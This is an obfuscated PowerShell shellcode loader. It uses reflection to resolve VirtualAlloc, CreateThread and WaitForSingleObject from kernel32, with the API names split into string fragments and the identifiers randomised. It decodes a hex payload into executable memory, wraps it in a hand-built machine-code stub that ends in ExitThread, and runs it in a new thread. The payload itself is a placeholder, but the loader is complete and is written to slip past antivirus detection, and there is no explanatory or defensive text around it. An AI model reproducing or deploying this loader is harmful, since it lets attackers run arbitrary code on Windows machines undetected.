function gacdd{
    param($ijym)
    function exgzb{
        Param(
            [Parameter( Position = 0, Mandatory = 0 )]
            [String]$klgr,
            [Parameter( Position = 1, Mandatory = 0 )]
            [String]$renz
        )

        $anzt = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('Sys'+'tem.dll')}
        $gmqv = $anzt.GetType('Mic'+'rosof'+'t.Win'+'32.Uns'+'afeN'+'ativeMe'+'thods')
        $klgrHandle = $gmqv.GetMethod('GetModuleHandle')
        $sikv = $gmqv.GetMethod('Ge'+'tProcAdd'+'ress', [reflection.bindingflags] ("Pub"+"lic"+",Stat"+"ic"), $moqj, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $moqj);
        $jscc = $klgrHandle.Invoke($moqj, @($klgr))
        $mkix = New-Object IntPtr
        $jhrv = New-Object System.Runtime.InteropServices.HandleRef($mkix, $jscc)
        return $sikv.Invoke($moqj, @([System.Runtime.InteropServices.HandleRef]$jhrv, $renz))
    }

    function kesrp{
        Param(
            [Parameter( Position = 0)]
            [Type[]]$qspw = (New-Object Type[](0)),
            [Parameter( Position = 1 )]
            [Type]$qgok = [Void]
        )

        $bold = [AppDomain]::CurrentDomain
        $crsm = New-Object System.Reflection.AssemblyName('Re'+'flect'+'edDeleg'+'ate')
        $sjkc = $bold.DefineDynamicAssembly($crsm, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $klgrBuilder = $sjkc.DefineDynamicModule('InM'+'emor'+'yModul'+'e', $lgfk)
        $wviu = $klgrBuilder.DefineType('M'+'yDelega'+'teTyp'+'e', 'Cla'+'ss, Publ'+'ic, S'+'ealed,'+' Ansi'+'Clas'+'s, AutoC'+'lass', [System.MulticastDelegate])
        $vnhi = $wviu.DefineConstructor('RTSpec'+'ialName, '+'HideBy'+'Sig'+', Pub'+'lic', [System.Reflection.CallingConventions]::Standard, $qspw)
        $vnhi.SetImplementationFlags('Ru'+'ntim'+'e, M'+'anage'+'d')
        $fyyp = $wviu.DefineMethod('Inv'+'oke', 'Pu'+'bli'+'c, H'+'ide'+'BySig'+', New'+'S'+'lot,'+' V'+'irt'+'ua'+'l', $qgok, $qspw)
        $fyyp.SetImplementationFlags('Run'+'time,'+' Mana'+'ged')
        return $wviu.CreateType()
    }

    function kvame ([IntPtr] $xpzp, [IntPtr] $yuyj, [Int] $iyvo){
        $iawg = $iyvo / 8

        function ConvertTo-LittleEndian ([IntPtr] $iogj){
            $trlc = New-Object Byte[](0)
            $iogj.ToString("X$($iawg*2)") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $trlc += [Byte] ('0x{0}' -f $_) } }
            [System.Array]::Reverse($trlc)
            return $trlc
        }

        $lpyz = New-Object Byte[](0)
    
        if ($iawg -eq 8){
            [Byte[]] $lpyz = 0x48,0xB8
            $lpyz += ConvertTo-LittleEndian $xpzp
            $lpyz += 0xFF,0xD0
            $lpyz += 0x6A,0x00
            $lpyz += 0x48,0xB8
            $lpyz += ConvertTo-LittleEndian $yuyj
            $lpyz += 0xFF,0xD0
        }
        else{
            [Byte[]] $lpyz = 0xB8
            $lpyz += ConvertTo-LittleEndian $xpzp
            $lpyz += 0xFF,0xD0
            $lpyz += 0x6A,0x00
            $lpyz += 0xB8
            $lpyz += ConvertTo-LittleEndian $yuyj
            $lpyz += 0xFF,0xD0
        }
        return $lpyz
    }

function wgwrn{
        $xpzpess = $xxhu.Invoke([IntPtr]::Zero, $ijym.Length + 1, 0x3000, 0x40)
        [System.Runtime.InteropServices.Marshal]::Copy($ijym, 0, $xpzpess, $ijym.Length)
        $yuyj = exgzb kernel32.dll ExitThread
    
        $lpyz = kvame $xpzpess $yuyj 32

        $lpyzAddress = $xxhu.Invoke([IntPtr]::Zero, $lpyz.Length + 1, 0x3000, 0x40)
        [System.Runtime.InteropServices.Marshal]::Copy($lpyz, 0, $lpyzAddress, $lpyz.Length)
        $krox = $ekbj.Invoke([IntPtr]::Zero, 0, $lpyzAddress, $xpzpess, 0, [IntPtr]::Zero)
        $nook.Invoke($krox, 0xFFFFFFFF) | Out-Null
    }

    
    $xxhuAddr = exgzb kernel32.dll ('Virt'+'ualA'+'lloc')
    $xxhuDelegate = kesrp @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
    $xxhu = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($xxhuAddr, $xxhuDelegate)
    $ekbjAddr = exgzb kernel32.dll ("C"+"reat"+"eT"+"hre"+"ad")
    $ekbjDelegate = kesrp @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
    $ekbj = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ekbjAddr, $ekbjDelegate)
    $nookAddr = exgzb kernel32.dll ("Wa"+"it"+"ForSi"+"ngl"+"eObje"+"ct")
    $nookDelegate = kesrp @([IntPtr], [Int32]) ([Int])
    $nook = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($nookAddr, $nookDelegate)

    wgwrn
}

$mkcf = "<Go to [encoded_data](encoded_payloaded)>"
$ijym = [byte[]] -split ($mkcf -replace '..', '0x$& ')
gacdd $ijym
...............s
